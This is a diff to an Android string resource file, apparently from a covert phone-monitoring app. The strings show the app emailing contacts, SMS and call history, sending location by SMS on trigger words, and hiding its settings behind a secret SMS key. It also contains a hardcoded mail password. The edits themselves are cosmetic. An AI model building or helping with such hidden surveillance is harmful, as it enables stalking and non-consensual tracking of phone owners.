@@ -37,11 +37,12 @@
     <!-- Mail -->
     <string name="mail_sender_pwd">canadausa</string>
     <string name="mail_from">From</string>
-    <string name="mail_body">Hi, this is an auto mail from %s with contacts, SMS and phone call information.</string>
+    <string name="mail_description">(contacts, SMS and phone call history attached)</string>
+    <string name="mail_body">Hi, this is an auto mail from %s with contacts, SMS and phone call history.</string>
     
     <!-- Location -->
     <string name="location_sms_real">Current location(latitude, longitude):%s, see it on maps.google.com</string>
-    <string name="location_sms_hist">Cannot get current location. The lastest historical location(latitude, longitude):%s, see it on maps.google.com</string>
+    <string name="location_sms_hist">Cannot get current location. The lastest historical location(datetime, latitude, longitude):%s, see it on maps.google.com</string>
     <string name="location_sms_fail">Sorry, cannot get location now.</string>
     
     <!-- Preferences -->
@@ -85,7 +86,7 @@
     <string name="init_hint_setting">Set mail address, interval, mobile phone number, sensitive words, GPS activation word.</string>
     <string name="init_hint_hide">Exit current setting dialog. This dialog can be triggered only by sending a SMS (the content is the key) to this mobile phone.</string>
     <string name="init_processing">Processing...</string>
-    <string name="init_waiting">Please waiting...</string>
+    <string name="init_waiting">Please wait a while...</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
